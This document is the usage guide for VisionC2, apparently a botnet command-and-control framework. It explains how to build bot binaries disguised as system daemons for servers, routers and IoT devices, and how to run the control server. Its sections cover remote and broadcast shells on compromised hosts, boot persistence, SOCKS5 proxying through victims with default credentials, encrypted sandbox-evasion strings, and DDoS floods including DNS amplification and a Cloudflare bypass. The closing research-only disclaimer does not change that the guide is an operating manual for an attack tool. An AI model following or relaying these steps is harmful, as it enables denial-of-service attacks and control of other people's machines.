# ☾℣☽ VisionC2 Usage Guide

> Complete guide for setup, configuration, and operation of VisionC2.

---

## 📑 Table of Contents

- [Prerequisites](#-prerequisites)
- [Building from Scratch](#-building-from-scratch)
- [Changing C2 Address](#-changing-c2-address)
- [Starting the CNC](#-starting-the-cnc)
- [TUI Interface](#-tui-interface)
- [Managing Bots](#-managing-bots)
- [Running Attacks](#-running-attacks)
- [Rebuilding Bots Only](#-rebuilding-bots-only)
- [Sensitive String Encryption](#-sensitive-string-encryption)
- [Removing Bot Persistence](#-removing-bot-persistence)
- [TLS Certificates](#-tls-certificates)
- [Troubleshooting](#-troubleshooting)

---

## 📋 Prerequisites

Before setting up VisionC2, ensure you have the following installed:

```bash
# Install required packages
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat

# Install Go 1.23+ (required)
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
```

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| RAM | 512MB | 2GB+ |
| Storage | 1GB | 5GB+ |
| OS | Linux (any distro) | Ubuntu 22.04+ / Debian 12+ |
| Network | Open port 443 (bots) | + Admin port for split mode |

---

## 🚀 Building from Scratch

### Step 1: Clone the Repository

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
```

### Step 2: Run the Setup Wizard

```bash
python3 setup.py
```

### Step 3: Setup Menu Options

```
╔════════════════════════════════════════════════════════════╗
║                    Setup Options                            ║
╠════════════════════════════════════════════════════════════╣
║  [1] Full Setup     - Complete fresh installation           ║
║  [2] Update C2 URL  - Change C2 address only                ║
║  [0] Exit                                                   ║
╚════════════════════════════════════════════════════════════╝
```

**Choose Option [1] for fresh install.**

### Step 4: Configuration Prompts

The wizard will ask for:

| Prompt | Description | Example |
|--------|-------------|---------|
| **C2 Address** | Domain or IP where bots connect | `c2.example.com` or `192.168.1.100` |
| **Admin Port** | Port for admin console (split mode) | `420` (default) |
| **Certificate Details** | For TLS cert generation | Country, State, City, Org |

### Step 5: Build Output

After completion, you'll have:

```
VisionC2/
├── cnc/certificates              
│   ├── server.crt       # TLS certificate
│   └── server.key       # TLS private key
├── bins/
│   └──...            # 14 bot binaries (different architectures)
└── setup_config.txt     # Your configuration summary
└── server    # Cnc Server Binary
```

---

## 🔄 Changing C2 Address

If you need to change your C2 address (new server, domain change, etc.):

### Method 1: Setup Wizard (Recommended)

```bash
cd VisionC2
python3 setup.py
# Select option [2] - Update C2 URL
```

### Method 2: Full Rebuild

```bash
python3 setup.py
# Select option [1] - Full Setup
```

> ⚠️ **After changing C2 address, you MUST redeploy bot binaries.**

---

## 🖥️ Starting the CNC

### Default Mode: TUI Interface

```bash
#In the Project Root Directory
./server
```

This launches the **Terminal User Interface (TUI)** - a full-featured graphical interface in your terminal with:

- Real-time bot dashboard
- Interactive menus and forms
- Remote shell access
- Attack builder
- Socks proxy manager
- Connection logs

### Split Mode: Telnet/Netcat Access

For remote access or multi-user scenarios:

```bash
./server --split
```

This starts the traditional telnet server on your configured admin port (default: 420). Connect with:

```bash
nc YOUR_SERVER_IP 420
# Type trigger word: spamtec
# Login with credentials
```

### Running in Background

```bash
# TUI mode in screen
screen -S ./server

# Split mode in screen
screen -S ./server --split

# Detach: Ctrl+A, then D
# Reattach: screen -r server
```

### First Run

On first run, a root user is created with a random password:

```
[☾℣☽] Login with username root and password XXXXXX
```

**Save this password!** You'll need it to login.

---

## 🎨 TUI Interface

The TUI is the default and recommended way to use VisionC2.

### Main Dashboard

```
  ____   ____.__       .__              _________  ________  
  \   \ /   /|__| _____|__| ____   ____ \_   ___ \ \_____  \ 
   \   Y   / |  |/  ___/  |/  _ \ /    \/    \  \/  /  ____/ 
    \     /  |  |\___ \|  (  <_> )   |  \     \____/       \ 
     \___/   |__/____  >__|\____/|___|  /\______  /\_______ \
                     \/               \/        \/         \/
Bots: 47  │  Attacks: 2  │  Uptime: 3h 25m │ Cores: 68 │ Ram: 82640MB                    


  ▸ 🤖 Bot List
    ⚡ Launch Attack
    📊 Ongoing Attacks
    🧦 Socks Manager
    📜 Connection Logs
    ❓ Help

  [↑/↓] Navigate  [enter] Select  [q] Quit
```

### Navigation

| Key | Action |
|-----|--------|
| `↑` / `k` | Move up |
| `↓` / `j` | Move down |
| `Enter` | Select / Confirm |
| `q` | Back / Quit |
| `Esc` | Cancel |
| `r` | Refresh data |

### Views

#### 🤖 Bot List

View all connected bots with real-time status:

```
  BOT LIST                                              [47 bots online]

  ▸ a1b2c3d4      192.168.1.100    amd64    4096 MB    2h 15m
    e5f6g7h8      10.0.0.50        arm64    1024 MB    45m
    x9y8z7w6      172.16.0.25     mips     512 MB     1h 30m

  [enter] Shell  [b] Broadcast Shell  [l] Attack  [i] Info  [q] Back
```

**Hotkeys:**

- `Enter` - Open remote shell to selected bot
- `b` - Open broadcast shell (all bots)
- `l` - Launch attack on selected bot
- `i` - Request system info
- `p` - Persist (with confirmation)
- `r` - Reinstall (with confirmation)
- `k` - Kill bot (with y/n confirmation)

#### 💻 Remote Shell

Interactive shell session with a single bot:

```
  💻 REMOTE SHELL
  Bot: a1b2c3d4     │ Arch: amd64
  ──────────────────────────────────────────────────────────

  root@bot:~$ whoami
  root
  root@bot:~$ uname -a
  Linux server1 5.15.0-generic x86_64 GNU/Linux
  root@bot:~$ █

  [ctrl+f] Clear  [ctrl+p] Persist  [ctrl+r] Reinstall  [esc] Exit
```

#### 📡 Broadcast Shell

Send commands to ALL bots simultaneously:

```
  📡 BROADCAST SHELL                                    [47 bots]
  ──────────────────────────────────────────────────────────

  Filter: All Bots
  broadcast:~$ █

  [ctrl+a] Filter Arch  [ctrl+g] Filter RAM  [ctrl+b] Max Bots
  [ctrl+p] Persist All  [ctrl+r] Reinstall All  [esc] Exit
```

**Targeting Filters:**

- `Ctrl+A` - Filter by architecture (amd64, arm64, mips, etc.)
- `Ctrl+G` - Filter by minimum RAM
- `Ctrl+B` - Limit max number of bots

#### ⚡ Launch Attack

Interactive attack builder:

```
  ⚡ LAUNCH ATTACK

  ▸ Method:    [!udpflood          ▼]
    Target:    192.168.1.100
    Port:      80
    Duration:  60

  [tab] Next Field  [enter] on Method to select  [l] Launch  [q] Cancel
```

#### 📊 Ongoing Attacks

Monitor active attacks:

```
  ONGOING ATTACKS                                       [2 active]

  !udpflood → 192.168.1.100:80     ████████░░  45s remaining
  !https    → example.com:443      ██████████  2m 30s remaining

  [s] Stop All  [r] Refresh  [q] Back
```

#### 🧦 Socks Manager

Manage SOCKS5 proxies on bots:

```
  🧦 SOCKS5 PROXY MANAGER

  [All Bots]  Active Socks   Stopped
  ────────────────────────────────────────────────────────

  Bots: 47   Active Proxies: 3   Bind: 0.0.0.0

  BOT ID            IP              ARCH      PORT    STATUS
  ──────────────────────────────────────────────────────────
  ▸ a1b2c3d4       192.168.1.100   amd64     1080    ● ACTIVE
    e5f6g7h8       10.0.0.50       arm64     1080    ● ACTIVE
    x9y8z7w6       172.16.0.25     mips      -       - NONE

  [s] Start Socks  [x] Stop Socks  [←/→] View  [r] Refresh  [q] Back
```

**Usage:**

1. Select a bot with `↑/↓`
2. Press `s` to start socks (enter port, default 1080)
3. Connect via `socks5://user:pass@BOT_IP:PORT` (default creds: `visionc2`/`synackrst666`)
4. Press `x` to stop socks on selected bot

**SOCKS5 Authentication:**

The proxy requires username/password by default. Update credentials at runtime from a shell:

```
!socksauth <username> <password>
```

Set both to empty strings in `bot/config.go` to allow unauthenticated access.

#### 📜 Connection Logs

View bot connection history:

```
  CONNECTION LOGS

  [All]  Connections   Disconnections
  ────────────────────────────────────────────────────────

  14:32:05  CONNECT     a1b2c3d4    192.168.1.100    amd64
  14:30:22  DISCONNECT  x9y8z7w6    172.16.0.25      mips
  14:28:15  CONNECT     e5f6g7h8    10.0.0.50        arm64

  [←/→] Filter  [r] Refresh  [q] Back
```

---

## 🤖 Managing Bots

### Bot Binaries

Bot binaries are in `bins/`:

| Binary | Architecture | Use Case |
|--------|--------------|----------|
| ethd0 | x86_64 (amd64) | Servers, desktops |
| kworkerd0 | x86 (386) | 32-bit systems |
| ip6addrd | ARM64 | Raspberry Pi 4, phones |
| mdsync1 | ARMv7 | Raspberry Pi 2/3 |
| deferwqd | MIPS | Routers |
| devfreqd0 | MIPSLE | Routers (little-endian) |
| *...and 8 more* | Various | IoT, embedded |

### Bot Commands (via TUI)

From the **Bot List** view:

| Hotkey | Command | Description |
|--------|---------|-------------|
| `i` | `!info` | Get system information |
| `p` | `!persist` | Setup boot persistence |
| `r` | `!reinstall` | Force re-download |
| `k` | `!lolnogtfo` | Kill and remove bot |

From **Remote/Broadcast Shell**:

| Hotkey | Command | Description |
|--------|---------|-------------|
| `Ctrl+P` | `!persist` | Persistence (confirms) |
| `Ctrl+R` | `!reinstall` | Reinstall (confirms) |
| `Ctrl+K` | `!lolnogtfo` | Kill (broadcast only) |

---

## ⚡ Running Attacks

### Via TUI (Recommended)

1. Go to **⚡ Launch Attack** from dashboard
2. Select attack method (press Enter on Method field)
3. Enter target, port, duration
4. Press `l` to launch

### Attack Methods

**Layer 4 (Network):**

- `!udpflood` - UDP packet flood
- `!tcpflood` - TCP connection flood  
- `!syn` - SYN flood
- `!ack` - ACK flood
- `!gre` - GRE protocol flood
- `!dns` - DNS amplification

**Layer 7 (Application):**

- `!http` - HTTP flood
- `!https` - HTTPS/TLS flood
- `!cfbypass` - Cloudflare bypass

### Monitoring Attacks

Go to **📊 Ongoing Attacks** to see:

- Active attacks with progress bars
- Time remaining
- Press `s` to stop all attacks

---

## 🔨 Rebuilding Bots Only

```bash
cd VisionC2/tools
./build.sh
```

Builds all 14 architectures with UPX compression.

---

## 🔐 Sensitive String Encryption

All sensitive strings (persistence paths, sandbox indicators, analysis tools, etc.) are AES-128-CTR encrypted in `bot/config.go`. No plaintext appears in the compiled binary.

### Crypto Tool

Use `tools/crypto.go` to encrypt, decrypt, or regenerate blobs:

```bash
# Encrypt a string
go run tools/crypto.go encrypt "/etc/rc.local"

# Encrypt a string slice (null-separated)
go run tools/crypto.go encrypt-slice "vmware" "vbox" "qemu"

# Decrypt a hex blob
go run tools/crypto.go decrypt <hex>

# Decrypt a slice blob (shows indexed items)
go run tools/crypto.go decrypt-slice <hex>

# Regenerate all blobs for config.go
go run tools/crypto.go generate

# Verify existing config.go blobs decrypt correctly
go run tools/crypto.go verify
```

### Updating Encrypted Strings

1. Edit the plaintext values in `tools/crypto.go` (inside `cmdGenerate()`)
2. Run `go run tools/crypto.go generate`
3. Paste the output into `bot/config.go`
4. Verify with `go run tools/crypto.go verify`

---

## 🧹 Removing Bot Persistence

If the bot was accidentally run outside debug mode, use the cleanup script:

```bash
sudo bash tools/cleanup.sh
```

This removes all persistence artifacts: systemd service, hidden directory, cron jobs, rc.local entries, lock/cache files, and running processes.

---

## 🔒 TLS Certificates

### Location

```
VisionC2/cnc/certificates
├── server.crt    # Public certificate
└── server.key    # Private key
```

### Regenerating

```bash
# Via setup wizard
python3 setup.py  # Select [1] Full Setup

# Manual
cd cnc/certificates
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
```

---

## 🔧 Troubleshooting

### TUI Won't Start

**Error:** Terminal too small

```bash
# Resize terminal to at least 80x24
# Or use a larger terminal emulator
```

### Port 443 Permission Denied

```bash
# Option 1: Run as root
sudo ./server

# Option 2: Set capabilities (recommended)
sudo setcap 'cap_net_bind_service=+ep' ./server
./server
```

### Bots Not Connecting

1. Check firewall: `sudo ufw allow 443/tcp`
2. Verify C2 in `setup_config.txt`
3. Test TLS: `openssl s_client -connect YOUR_SERVER:443`


### Build Errors

```bash
# Go not found
export PATH=$PATH:/usr/local/go/bin

# UPX not found
sudo apt install upx-ucl
```

---

## 📚 Additional Resources
- [Architecture](Docs/ARCHITECTURE.md) - Full technical details
- [Command Reference](Docs/COMMANDS.md) - Full TUI hotkey and command reference
- [Changelog](Docs/CHANGELOG.md) - Version history

---

## ⚖️ Legal Disclaimer

VisionC2 is for **authorized security research only**. Users must obtain written permission before testing any systems.

---

*VisionC2 - ☾℣☽*
